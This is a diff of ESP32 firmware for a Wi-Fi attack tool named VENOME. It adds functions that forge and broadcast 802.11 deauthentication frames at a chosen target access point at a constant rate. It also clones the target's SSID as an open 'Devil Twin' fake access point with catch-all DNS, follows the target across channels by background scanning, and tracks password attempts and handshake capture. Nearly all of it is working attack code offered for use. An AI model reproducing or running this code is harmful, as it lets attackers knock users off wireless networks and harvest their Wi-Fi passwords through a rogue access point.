+  _html += "</div>";
+
+  _html += "</div></body></html>";
+
+  webServer.send(200, "text/html; charset=utf-8", _html);
+}
+
+// Add this function to send broadcast deauth during Devil Twin
+void send_devil_broadcast_deauth()
+{
+  if (!deauthing_active || !devil_twin_active)
+    return;
+
+  uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00,
+                              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x01, 0x00};
+
+  memcpy(&deauthPacket[10], devil_target_bssid, 6);
+  memcpy(&deauthPacket[16], devil_target_bssid, 6);
+
+  for (int i = 0; i < 5; i++)
+  {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(1);
+  }
+
+  eliminated_stations++;
+  Serial.println("Sent broadcast deauth from Devil Twin");
+}
+
+void startCombinedDeauth()
+{
+  start_combined_deauth(devil_target_bssid, devil_target_channel);
+  deauth_attack_active = true;
+
+  Serial.print("⚡ Starting combined deauth on real AP: ");
+  for (int i = 0; i < 6; i++)
+  {
+    Serial.printf("%02X:", devil_target_bssid[i]);
+  }
+  Serial.printf(" Channel: %d\n", devil_target_channel);
+}
+
+// ==================== DEVIL TWIN STYLE DEAUTH WITH BACKGROUND SCAN ====================
+// ==================== DEVIL TWIN STYLE DEAUTH WITH BACKGROUND SCAN ====================
+void startDevilTwinStyleDeauthWithBackgroundScan()
+{
+  monitorStartTime = millis();
+  clientCount = 0;
+  attemptCount = 0;
+  totalUniqueClients = 0;
+  eliminated_stations = 0;
+  total_history_clients = 0;
+  uniqueClientMACs.clear();
+  memset(clients, 0, sizeof(clients));
+  memset(passwordAttempts, 0, sizeof(passwordAttempts));
+
+  if (_selectedNetwork.ssid == "")
+    return;
+
+  Serial.println("\n═══════════════════════════════");
+  Serial.println("👿 CONSTANT RATE DEVIL STYLE DEAUTH");
+  Serial.println("═══════════════════════════════");
+
+  // Copy target info
+  real_target_ssid = _selectedNetwork.ssid;
+  real_target_channel = _selectedNetwork.ch;
+  memcpy(real_target_bssid, _selectedNetwork.bssid, 6);
+
+  // Also set devil target variables for compatibility
+  devil_target_ssid = _selectedNetwork.ssid;
+  devil_target_channel = _selectedNetwork.ch;
+  memcpy(devil_target_bssid, _selectedNetwork.bssid, 6);
+
+  Serial.printf("📡 Target SSID: %s\n", real_target_ssid.c_str());
+  Serial.printf("📡 Target Channel: %d\n", real_target_channel);
+  Serial.printf("📡 Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                real_target_bssid[0], real_target_bssid[1], real_target_bssid[2],
+                real_target_bssid[3], real_target_bssid[4], real_target_bssid[5]);
+
+  // Stop any existing deauth if running
+  if (deauthing_active)
+  {
+    stop_deauth();
+  }
+
+  // Ensure NO fake AP is running
+  if (hotspot_active || evil_twin_running || devil_twin_active)
+  {
+    dnsServer.stop();
+    WiFi.softAPdisconnect(true);
+    hotspot_active = false;
+    evil_twin_running = false;
+    devil_twin_active = false;
+  }
+
+  // Set all flags for Devil Twin style operation
+  combined_attack_active = true;
+  deauth_attack_active = true;
+  deauthing_active = true; // This will show "Deauth" in status
+  attack_active = true;
+  background_scanning_active = true;
+
+  // CRITICAL: These must be FALSE to prevent fake AP
+  devil_twin_active = false;   // Main devil twin flag OFF
+  evil_twin_running = false;   // Evil twin flag OFF
+  hotspot_active = false;      // Hotspot flag OFF
+  isVerifyingPassword = false; // No verification
+  passwordFound = false;       // No password tracking
+
+  // Reset counters
+  lastAttemptedPassword = "";
+  totalAttempts = 0;
+  wrongAttempts = 0;
+  connectedClients = 0;
+
+  last_scan_time = millis();
+  last_client_check = millis();
+  last_deauth_send = millis() - DEAUTH_INTERVAL_MS;           // Start deauth immediately
+  last_constant_deauth = millis() - CONSTANT_DEAUTH_INTERVAL; // Start constant deauth immediately
+  last_mac_cleanup = millis();
+  // Configure WiFi mode - AP+STA mode required for deauth
+  WiFi.mode(WIFI_AP_STA);
+
+  // Make sure our management AP is running (original PacketWiFi AP)
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP("VENOME v1", "Venome@kali"); // Original management AP
+
+  // Restart DNS server for management
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  // Set channel to target's channel
+  esp_wifi_set_channel(real_target_channel, WIFI_SECOND_CHAN_NONE);
+
+  uint8_t verify_channel;
+  esp_wifi_get_channel(&verify_channel, NULL);
+  Serial.printf("📡 Verified channel: %d\n", verify_channel);
+
+  // Initialize deauth frame for broadcast deauth
+  memset(&deauth_frame, 0, sizeof(deauth_frame));
+  deauth_frame.frame_control[0] = 0xC0; // Deauth frame type
+  deauth_frame.frame_control[1] = 0x00;
+  deauth_frame.reason = 5; // Reason: Disassociated due to inactivity
+  memcpy(deauth_frame.sender, real_target_bssid, 6);
+  memcpy(deauth_frame.access_point, real_target_bssid, 6);
+
+  // ❌ DON'T use start_deauth() - remove or comment this line
+  // start_deauth(0, DEAUTH_TYPE_SINGLE, 5); // Comment this out
+
+  // Send initial burst of broadcast deauth packets (OPTIONAL - for immediate effect)
+  Serial.println("📢 Sending initial broadcast deauth burst...");
+  for (int i = 0; i < 20; i++)
+  {
+    uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    memcpy(deauth_frame.station, broadcast_addr, 6);
+    esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t *)&deauth_frame, sizeof(deauth_frame), false);
+    delay(5);
+  }
+
+  Serial.println("═══════════════════════════════");
+  Serial.println("✅ CONSTANT RATE Deauth Started!");
+  Serial.printf("📊 CONSTANT RATE: %d packets/sec\n", (1000 / CONSTANT_DEAUTH_INTERVAL) * PACKETS_PER_BURST);
+  Serial.printf("   → Every %dms: %d packets\n", CONSTANT_DEAUTH_INTERVAL, PACKETS_PER_BURST);
+  Serial.println("⚠️  NO fake AP - Only deauth and background scanning");
+  Serial.println("📡 Management AP: VENOME v1 is still available");
+  Serial.println("═══════════════════════════════\n");
+}
+
+// ==================== STOP FUNCTION ====================
+void stopDevilTwinStyleDeauthWithBackgroundScan()
+{
+  Serial.println("\n═══════════════════════════════");
+  Serial.println("🛑 Stopping Devil Twin Style Deauth + Background Scan");
+  Serial.println("═══════════════════════════════");
+
+  // Stop deauth attacks
+  if (deauth_attack_active || deauthing_active)
+  {
+    stop_deauth();
+    deauth_attack_active = false;
+    deauthing_active = false;
+    attack_active = false;
+  }
+
+  // Stop background scanning
+  background_scanning_active = false;
+  background_scan_in_progress = false;
+
+  // Reset all related flags
+  combined_attack_active = false;
+  isVerifyingPassword = false;
+  showingProgress = false;
+
+  // Clear client tracking
+  uniqueClientMACs.clear();
+  uniqueClientMACs.shrink_to_fit();
+  total_history_clients = 0;
+
+  // Make sure management AP is still running
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  WiFi.softAP("VENOME v1", "Venome@kali");
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+  Serial.println("✅ Devil Twin Style Deauth + Background Scan Stopped");
+  Serial.println("📡 Management AP: VENOME v1 is still running");
+  Serial.println("═══════════════════════════════\n");
+}
+
+// ==================== SEND CONSTANT RATE DEAUTH PACKETS ====================
+void send_constant_deauth()
+{
+  if (!deauth_attack_active || !combined_attack_active)
+    return;
+
+  uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+  memset(&deauth_frame, 0, sizeof(deauth_frame));
+  deauth_frame.frame_control[0] = 0xC0;
+  deauth_frame.frame_control[1] = 0x00;
+  deauth_frame.reason = 5;
+
+  memcpy(deauth_frame.sender, real_target_bssid, 6);
+  memcpy(deauth_frame.station, broadcast_addr, 6);
+  memcpy(deauth_frame.access_point, real_target_bssid, 6);
+
+  // Send EXACT number of packets with EXACT delay
+  for (int i = 0; i < PACKETS_PER_BURST; i++)
+  {
+    esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t *)&deauth_frame, sizeof(deauth_frame), false);
+
+    // Don't delay after last packet
+    if (i < PACKETS_PER_BURST - 1)
+    {
+      delay(PACKET_DELAY_MS);
+    }
+  }
+
+  eliminated_stations++;
+}
+
+void send_broadcast_deauth()
+{
+  if (!deauth_attack_active || !combined_attack_active)
+    return;
+
+  uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+  memset(&deauth_frame, 0, sizeof(deauth_frame));
+  deauth_frame.frame_control[0] = 0xC0;
+  deauth_frame.frame_control[1] = 0x00;
+  deauth_frame.reason = 5;
+
+  memcpy(deauth_frame.sender, real_target_bssid, 6);
+  memcpy(deauth_frame.station, broadcast_addr, 6);
+  memcpy(deauth_frame.access_point, real_target_bssid, 6);
+
+  for (int i = 0; i < 5; i++)
+  {
+    esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t *)&deauth_frame, sizeof(deauth_frame), false);
+    delay(10);
+  }
+
+  eliminated_stations++;
+}
+
+// Add updateClientTracking function
+void updateClientTracking()
+{
+  wifi_sta_list_t wifi_sta_list;
+  esp_wifi_ap_get_sta_list(&wifi_sta_list);
+
+  for (int i = 0; i < wifi_sta_list.num; i++)
+  {
+    uint8_t *mac = wifi_sta_list.sta[i].mac;
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
+    String clientMac = String(macStr);
+    bool found = false;
+
+    for (int j = 0; j < clientCount; j++)
+    {
+      if (clients[j].mac == clientMac)
+      {
+        clients[j].lastSeen = millis();
+        found = true;
+        break;
+      }
+    }
+
+    if (!found && clientCount < MAX_CLIENTS)
+    {
+      clients[clientCount].mac = clientMac;
+      clients[clientCount].firstSeen = millis();
+      clients[clientCount].lastSeen = millis();
+      clients[clientCount].packetsCaptured = 0;
+      clients[clientCount].everSubmittedPassword = false;
+      clientCount++;
+      totalUniqueClients = clientCount;
+    }
+  }
+}
+
+// Replace the existing startDevilTwin() function with this version
+void startDevilTwin()
+{
+  monitorStartTime = millis();
+  clientCount = 0;
+  attemptCount = 0;
+  totalUniqueClients = 0;
+  eliminated_stations = 0;
+  total_history_clients = 0;
+  uniqueClientMACs.clear();
+  memset(clients, 0, sizeof(clients));
+  memset(passwordAttempts, 0, sizeof(passwordAttempts));
+
+  if (_selectedNetwork.ssid == "")
+    return;
+
+  Serial.println("\n═══════════════════════════════");
+  Serial.println("👿 Starting Devil Twin Attack!");
+  Serial.println("═══════════════════════════════");
+
+  real_target_ssid = _selectedNetwork.ssid;
+  real_target_channel = _selectedNetwork.ch;
+  memcpy(real_target_bssid, _selectedNetwork.bssid, 6);
+
+  devil_target_ssid = _selectedNetwork.ssid;
+  devil_target_channel = _selectedNetwork.ch;
+  memcpy(devil_target_bssid, _selectedNetwork.bssid, 6);
+
+  Serial.printf("📡 Target SSID: %s\n", real_target_ssid.c_str());
+  Serial.printf("📡 Target Channel: %d\n", real_target_channel);
+  Serial.printf("📡 Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                real_target_bssid[0], real_target_bssid[1], real_target_bssid[2],
+                real_target_bssid[3], real_target_bssid[4], real_target_bssid[5]);
+
+  if (deauthing_active)
+  {
+    stop_deauth();
+    deauthing_active = false;
+  }
+
+  if (hotspot_active)
+  {
+    dnsServer.stop();
+    WiFi.softAPdisconnect(true);
+    hotspot_active = false;
+  }
+
+  combined_attack_active = true;
+  evil_twin_running = true;
+  deauth_attack_active = true;
+  devil_twin_active = true;
+  hotspot_active = true;
+  deauthing_active = true;
+  attack_active = true;
+  background_scanning_active = true;
+  passwordFound = false;
+  isVerifyingPassword = false;
+  foundPassword = "";
+  lastAttemptedPassword = "";
+  totalAttempts = 0;
+  wrongAttempts = 0;
+  connectedClients = 0;
+
+  // Initialize timing variables - USE CONSTANT TIMER
+  last_scan_time = millis();
+  last_deauth_send = millis() - DEAUTH_INTERVAL_MS; // Start deauth immediately
+  last_client_check = millis();
+  last_constant_deauth = millis() - CONSTANT_DEAUTH_INTERVAL; // Start deauth immediately
+  last_mac_cleanup = millis();
+
+  Serial.printf("🎭 Fake AP Channel: %d (same as target)\n", real_target_channel);
+  Serial.printf("⚡ Deauth Channel: %d (same as target)\n", real_target_channel);
+
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+
+  WiFi.softAP(_selectedNetwork.ssid.c_str(), NULL, real_target_channel, 0, 4);
+
+  esp_wifi_set_channel(real_target_channel, WIFI_SECOND_CHAN_NONE);
+
+  uint8_t verify_channel;
+  esp_wifi_get_channel(&verify_channel, NULL);
+  Serial.printf("📡 Verified channel: %d\n", verify_channel);
+
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  memset(&deauth_frame, 0, sizeof(deauth_frame));
+  deauth_frame.frame_control[0] = 0xC0;
+  deauth_frame.frame_control[1] = 0x00;
+  deauth_frame.reason = 5;
+  memcpy(deauth_frame.sender, real_target_bssid, 6);
+  memcpy(deauth_frame.access_point, real_target_bssid, 6);
+
+  Serial.println("═══════════════════════════════");
+  Serial.println("✅ Devil Twin Started!");
+  Serial.println("═══════════════════════════════\n");
+}
+
+// Replace the existing stopDevilTwin() function
+void stopDevilTwin()
+{
+  Serial.println("Stopping Devil Twin...");
+
+  if (deauth_attack_active || deauthing_active)
+  {
+    stop_deauth();
+    deauth_attack_active = false;
+    deauthing_active = false;
+    attack_active = false;
+  }
+
+  if (evil_twin_running || hotspot_active)
+  {
+    dnsServer.stop();
+    WiFi.softAPdisconnect(true);
+    evil_twin_running = false;
+    hotspot_active = false;
+  }
+
+  devil_twin_active = false;
+  combined_attack_active = false;
+  background_scanning_active = false;
+  background_scan_in_progress = false;
+  isVerifyingPassword = false;
+  showingProgress = false;
+
+  uniqueClientMACs.clear();
+  uniqueClientMACs.shrink_to_fit();
+  total_history_clients = 0;
+
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  WiFi.softAP("VENOME v1", "Venome@kali");
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+  Serial.println("Devil Twin stopped");
+}
+
+// Add updateClientCount function (using existing variables)
+void updateClientCount()
+{
+  if (!evil_twin_running && !devil_twin_active)
+    return;
+
+  wifi_sta_list_t stationList;
+  tcpip_adapter_sta_list_t adapterList;
+
+  esp_wifi_ap_get_sta_list(&stationList);
+  tcpip_adapter_get_sta_list(&stationList, &adapterList);
+
+  connectedClients = stationList.num;
+
+  for (int i = 0; i < adapterList.num; i++)
+  {
+    uint8_t *mac = adapterList.sta[i].mac;
+    char macStr[18];
+    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
+    String macString = String(macStr);
+
+    bool found = false;
+    for (int j = 0; j < clientCount; j++)
+    {
+      if (clients[j].mac == macString)
+      {
+        found = true;
+        break;
+      }
+    }
+
+    if (!found)
+    {
+      if (std::find(uniqueClientMACs.begin(), uniqueClientMACs.end(), macString) == uniqueClientMACs.end())
+      {
+        if (uniqueClientMACs.size() < MAX_STORED_CLIENTS)
+        {
+          uniqueClientMACs.push_back(macString);
+          total_history_clients++;
+        }
+        else
+        {
+          total_history_clients++;
+        }
+      }
+    }
+  }
+}
+
+// Replace your existing performBackgroundScan function with this
+void performBackgroundScan()
+{
+  if (!background_scanning_active || background_scan_in_progress)
+  {
+    return;
+  }
+
+  background_scan_in_progress = true;
+  Serial.println("\n═══════════════════════════════");
+  Serial.println("🔍 Performing background scan...");
+
+  // ⚠️ EXTRA CHECK - Agar password verification shuru ho gayi to scan band karo
+  if (isVerifyingPassword)
+  {
+    Serial.println("Scan cancelled - password verification in progress");
+    background_scan_in_progress = false;
+    return;
+  }
+
+  // Save current mode
+  bool wasEvilTwinRunning = evil_twin_running || devil_twin_active;
+  bool wasDeauthActive = deauth_attack_active;
+
+  // Temporarily stop web server and DNS for scanning
+  if (wasEvilTwinRunning)
+  {
+    webServer.stop();
+    dnsServer.stop();
+  }
+
+  // CRITICAL: Deauth KO MAT ROKO - sirf channel change karo
+  if (wasDeauthActive)
+  {
+    // Deauth ko temporarily pause karo
+    stop_deauth();
+    delay(50);
+  }
+
+  // Switch to station mode for scanning
+  WiFi.mode(WIFI_AP_STA);
+  // WiFi.disconnect();
+  delay(100);
+
+  // ⚠️ CHECK AGAIN - Agar password verification shuru ho gayi to wapas AP mode
+  if (isVerifyingPassword)
+  {
+    WiFi.mode(WIFI_AP_STA);
+    if (wasEvilTwinRunning)
+    {
+      dnsServer.start(DNS_PORT, "*", apIP);
+      webServer.begin();
+    }
+    if (wasDeauthActive)
+    {
+      start_deauth(0, DEAUTH_TYPE_SINGLE, 5);
+    }
+    background_scan_in_progress = false;
+    return;
+  }
+
+  // Perform scan
+  int foundNetworks = WiFi.scanNetworks(false, true);
+  bool targetFound = false;
+
+  // Search for our target AP
+  for (int i = 0; i < foundNetworks; i++)
+  {
+    String currentSSID = WiFi.SSID(i);
+
+    if (currentSSID == real_target_ssid)
+    {
+      int newChannel = WiFi.channel(i);
+      String newBSSID = WiFi.BSSIDstr(i);
+
+      // Channel change detected?
+      if (newChannel != real_target_channel)
+      {
+        Serial.println("\n═══════════════════════════════");
+        Serial.println("🔄 CHANNEL CHANGE DETECTED!");
+        Serial.printf("📡 Old channel: %d → New channel: %d\n",
+                      real_target_channel, newChannel);
+        Serial.println("═══════════════════════════════\n");
+
+        // Update target channel
+        real_target_channel = newChannel;
+      }
+
+      sscanf(newBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+             &real_target_bssid[0], &real_target_bssid[1], &real_target_bssid[2],
+             &real_target_bssid[3], &real_target_bssid[4], &real_target_bssid[5]);
+
+      targetFound = true;
+      break;
+    }
+  }
+
+  if (!targetFound)
+  {
+    Serial.println("⚠️ Target AP not found in background scan");
+  }
+
+  // ⚠️ FINAL CHECK - Agar password verification shuru ho gayi to mat karo restore
+  if (isVerifyingPassword)
+  {
+    background_scan_in_progress = false;
+    return;
+  }
+
+  // Restore WiFi mode - AP KO DUBARA START KARO
+  if (wasEvilTwinRunning)
+  {
+    WiFi.mode(WIFI_AP_STA);
+
+    // AP ko restart karo with NEW channel agar change hua hai
+    if (targetFound)
+    {
+      // Channel update karo agar change hua hai
+      esp_wifi_set_channel(real_target_channel, WIFI_SECOND_CHAN_NONE);
+      Serial.printf("📡 AP channel updated to: %d\n", real_target_channel);
+    }
+
+    dnsServer.start(DNS_PORT, "*", apIP);
+    webServer.begin();
+  }
+  else
+  {
+    WiFi.mode(WIFI_AP_STA);
+  }
+
+  // Deauth ko RESTART karo agar pehle active tha
+  if (wasDeauthActive)
+  {
+    // Deauth restart with updated channel
+    stop_deauth(); // Extra safety
+    delay(50);
+    start_deauth(0, DEAUTH_TYPE_SINGLE, 5);
+    deauth_attack_active = true;
+    Serial.println("⚡ Deauth restarted on new channel");
+  }
+
+  background_scan_in_progress = false;
+  last_scan_time = millis();
+
+  Serial.printf("⏰ Next scan in %d seconds\n", BACKGROUND_SCAN_INTERVAL / 1000);
+  Serial.println("═══════════════════════════════\n");
+}
+
+void handleHandshake()
+{
+  Serial.println("\n========== HANDSHAKE CAPTURE BUTTON CLICKED ==========");
+  Serial.println("⚡ Handshake Capture button clicked!");
+  Serial.println("===================================================\n");
+
+  // 1. Stop everything from PacketWiFi
+  Serial.println("🛑 Stopping all PacketWiFi operations...");
+
+  // Stop DNS
+  dnsServer.stop();
+
+  // Stop Web Server
+  webServer.close();
+  webServer.stop();
+
+  // Stop WiFi AP
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+
+  // Stop all attacks
+  if (deauthing_active)
+  {
+    stop_deauth();
+    deauthing_active = false;
+  }
+
+  if (devil_twin_active)
+  {
+    stopDevilTwin();
+  }
+
+  hotspot_active = false;
+  background_scanning_active = false;
+  background_scan_in_progress = false;
+  isVerifyingPassword = false;
+  passwordFound = false;
+
+  // Clear arrays
+  clientCount = 0;
+  attemptCount = 0;
+  totalUniqueClients = 0;
+  memset(clients, 0, sizeof(clients));
+  memset(passwordAttempts, 0, sizeof(passwordAttempts));
+
+  Serial.println("✅ PacketWiFi stopped. venome = true");
+  Serial.println("🔄 Restarting ESP32 to start Venome Project...");
+
+  // 3. Restart ESP32 to start Venome Project
+  delay(2000); // Give time for serial messages
+  prefs.begin("boot", false);
+  prefs.putInt("mode", 1); // 1 = Venome
+  prefs.end();
+
+  ESP.restart();
+}
+
+void handleVenomeVerifies()
+{
+  Serial.println("\n========== Venome Verifier BUTTON CLICKED ==========");
+  Serial.println("⚡ Venomme Verified button clicked!");
+  Serial.println("===================================================\n");
+
+  // Create cyberpunk-styled HTML response that matches Venome design
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>";
+  html += "@font-face {";
+  html += "  font-family: 'Orbitron';";
+  html += "  font-style: normal;";
+  html += "  font-weight: 400;";
+  html += "  src: url('/fonts/Orbitron-Regular.ttf') format('truetype');";
+  html += "}";
+  html += "* { margin: 0; padding: 0; box-sizing: border-box; }";
+  html += "body {";
+  html += "  background: #0a0f1f;";
+  html += "  color: #fff;";
+  html += "  font-family: 'Orbitron', sans-serif;";
+  html += "  min-height: 100vh;";
+  html += "  display: flex;";
+  html += "  align-items: center;";
+  html += "  justify-content: center;";
+  html += "  padding: 20px;";
+  html += "  position: relative;";
+  html += "  overflow-x: hidden;";
+  html += "}";
+  html += "body::before {";
+  html += "  content: '';";
+  html += "  position: fixed;";
+  html += "  top: 0; left: 0; width: 100%; height: 100%;";
+  html += "  background: radial-gradient(circle at 20% 50%, rgba(255, 0, 255, 0.1) 0%, transparent 50%),";
+  html += "              radial-gradient(circle at 80% 80%, rgba(0, 255, 255, 0.1) 0%, transparent 50%);";
+  html += "  pointer-events: none;";
+  html += "  z-index: -1;";
+  html += "}";
+  html += ".cyber-card {";
+  html += "  background: rgba(10, 15, 31, 0.95);";
+  html += "  border: 2px solid #00ffff;";
+  html += "  box-shadow: 0 0 30px #00ffff, inset 0 0 30px rgba(0, 255, 255, 0.2);";
+  html += "  padding: 40px;";
+  html += "  max-width: 600px;";
+  html += "  width: 100%;";
+  html += "  text-align: center;";
+  html += "  position: relative;";
+  html += "  backdrop-filter: blur(10px);";
+  html += "  animation: fadeIn 0.5s ease;";
+  html += "}";
+  html += ".cyber-card::before {";
+  html += "  content: '';";
+  html += "  position: absolute;";
+  html += "  top: -2px; left: -2px; right: -2px; bottom: -2px;";
+  html += "  background: linear-gradient(45deg, #ff00ff, #00ffff, #ff00ff);";
+  html += "  z-index: -1;";
+  html += "  animation: borderGlow 2s linear infinite;";
+  html += "}";
+  html += "@keyframes borderGlow {";
+  html += "  0% { opacity: 0.5; }";
+  html += "  50% { opacity: 1; }";
+  html += "  100% { opacity: 0.5; }";
+  html += "}";
+  html += "@keyframes fadeIn {";
+  html += "  from { opacity: 0; transform: scale(0.9); }";
+  html += "  to { opacity: 1; transform: scale(1); }";
+  html += "}";
+  html += ".glitch-text {";
+  html += "  font-size: 2.2em;";
+  html += "  font-weight: 800;";
+  html += "  text-transform: uppercase;";
+  html += "  text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff;";
+  html += "  animation: glitch 3s infinite;";
+  html += "  margin-bottom: 20px;";
+  html += "}";
+  html += "@keyframes glitch {";
+  html += "  0%, 100% { text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff; }";
+  html += "  25% { text-shadow: -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #00ffff; }";
+  html += "  50% { text-shadow: 0.025em 0.05em 0 #ff00ff, 0.05em 0 0 #00ffff; }";
+  html += "  75% { text-shadow: -0.025em 0 0 #ff00ff, -0.025em -0.05em 0 #00ffff; }";
+  html += "}";
+  html += ".success-icon {";
+  html += "  font-size: 5em;";
+  html += "  margin: 20px 0;";
+  html += "  animation: pulse 2s infinite;";
+  html += "}";
+  html += "@keyframes pulse {";
+  html += "  0%, 100% { transform: scale(1); text-shadow: 0 0 20px #ff00ff; }";
+  html += "  50% { transform: scale(1.1); text-shadow: 0 0 40px #00ffff; }";
+  html += "}";
+  html += "h2 {";
+  html += "  color: #00ffff;";
+  html += "  font-size: 1.8em;";
+  html += "  margin: 20px 0;";
+  html += "  text-shadow: 0 0 15px #00ffff;";
+  html += "  letter-spacing: 3px;";
+  html += "}";
+  html += ".status-text {";
+  html += "  color: #ff00ff;";
+  html += "  margin: 15px 0;";
+  html += "  font-size: 1.2em;";
+  html += "  text-shadow: 0 0 10px #ff00ff;";
+  html += "}";
+  html += ".status-text span {";
+  html += "  color: #ffff00;";
+  html += "  text-shadow: 0 0 10px #ffff00;";
+  html += "}";
+  html += ".progress-bar {";
+  html += "  width: 100%;";
+  html += "  height: 4px;";
+  html += "  background: rgba(255, 0, 255, 0.2);";
+  html += "  margin: 30px 0 10px;";
+  html += "  position: relative;";
+  html += "  overflow: hidden;";
+  html += "}";
+  html += ".progress-fill {";
+  html += "  position: absolute;";
+  html += "  top: 0; left: 0; height: 100%; width: 100%;";
+  html += "  background: linear-gradient(90deg, #ff00ff, #00ffff);";
+  html += "  animation: progress 2s ease-in-out infinite;";
+  html += "}";
+  html += "@keyframes progress {";
+  html += "  0% { left: -100%; }";
+  html += "  100% { left: 100%; }";
+  html += "}";
+  html += ".redirect-text {";
+  html += "  color: #888;";
+  html += "  font-size: 1em;";
+  html += "  margin-top: 25px;";
+  html += "  letter-spacing: 2px;";
+  html += "}";
+  html += ".blink {";
+  html += "  animation: blink 1s infinite;";
+  html += "}";
+  html += "@keyframes blink {";
+  html += "  0%, 50% { opacity: 1; }";
+  html += "  51%, 100% { opacity: 0.5; }";
+  html += "}";
+  html += "@media (max-width: 768px) {";
+  html += "  .cyber-card { padding: 30px 20px; }";
+  html += "  .glitch-text { font-size: 1.6em; }";
+  html += "  h2 { font-size: 1.4em; }";
+  html += "  .status-text { font-size: 1em; }";
+  html += "  .success-icon { font-size: 4em; }";
+  html += "}";
+  html += "</style>";
+  html += "</head><body>";
+  html += "<div class='cyber-card'>";
+  html += "<div class='glitch-text'>VENOME</div>";
+  html += "<div class='success-icon'>⚡</div>";
+  html += "<h2>Switching to Venome Project</h2>";
+  html += "<div class='status-text'>Stopping all attacks... <span class='blink'>⏳</span></div>";
+  html += "<div class='status-text'>Initializing Venome Verifier ... <span class='blink'>🔓</span></div>";
+  html += "<div class='progress-bar'><div class='progress-fill'></div></div>";
+  html += "<div class='redirect-text'>Redirecting in <span id='countdown'>2</span>s</div>";
+  html += "</div>";
+  html += "<script>";
+  html += "let seconds = 2;";
+  html += "let countdown = setInterval(() => {";
+  html += "  seconds--;";
+  html += "  if(seconds >= 0) {";
+  html += "    document.getElementById('countdown').textContent = seconds;";
+  html += "  }";
+  html += "  if(seconds === 0) {";
+  html += "    clearInterval(countdown);";
+  html += "    window.location.href = '/admin';";
+  html += "  }";
+  html += "}, 1000);";
+  html += "</script>";
+  html += "</body></html>";
+
+  webServer.send(200, "text/html", html);
+
+  // 1. Stop everything from PacketWiFi
+  Serial.println("🛑 Stopping all PacketWiFi operations...");
+
+  // Stop DNS
+  dnsServer.stop();
+
+  // Stop Web Server
+  webServer.close();
+  webServer.stop();
+
+  // Stop WiFi AP
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+
+  // Stop all attacks
+  if (deauthing_active)
+  {
+    stop_deauth();
+    deauthing_active = false;
+  }
+
+  if (devil_twin_active)
+  {
+    stopDevilTwin();
+  }
+
+  hotspot_active = false;
+  background_scanning_active = false;
+  background_scan_in_progress = false;
+  isVerifyingPassword = false;
+  passwordFound = false;
+
+  // Clear arrays
+  clientCount = 0;
+  attemptCount = 0;
+  totalUniqueClients = 0;
+  memset(clients, 0, sizeof(clients));
+  memset(passwordAttempts, 0, sizeof(passwordAttempts));
+
+  Serial.println("✅ PacketWiFi stopped. venome = true");
+  Serial.println("🔄 Restarting ESP32 to start Venome Verifier Project...");
+
+  // 3. Restart ESP32 to start Venome Project
+  delay(2000); // Give time for serial messages
+  prefs.begin("boot", false);
+  prefs.putInt("mode", 2); // 1 = Venome
+  prefs.end();
+
+  ESP.restart();
+}
+//--------------------------------------VENOME-------------------------------
+/**
+ * @file main.cpp
+ * @author Modified for PlatformIO Arduino (ESP-IDF compatible)
+ * @brief Starts management AP and webserver - IDENTICAL to ESP-IDF version
+ */
+
+#include <Arduino.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+// ESP-IDF headers (available in Arduino framework)
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "esp_timer.h"
+#include "esp_wifi.h"
+#include "esp_wifi_types.h"
+#include "esp_http_server.h"
+#include "esp_netif.h"
+#include "nvs_flash.h"
+
+// Project includes
+#include "pages/page_index.h"
+
+// ==================== Configuration ====================
+#define CONFIG_SCAN_MAX_AP 20
+#define CONFIG_MGMT_AP_SSID "VENOME v2"
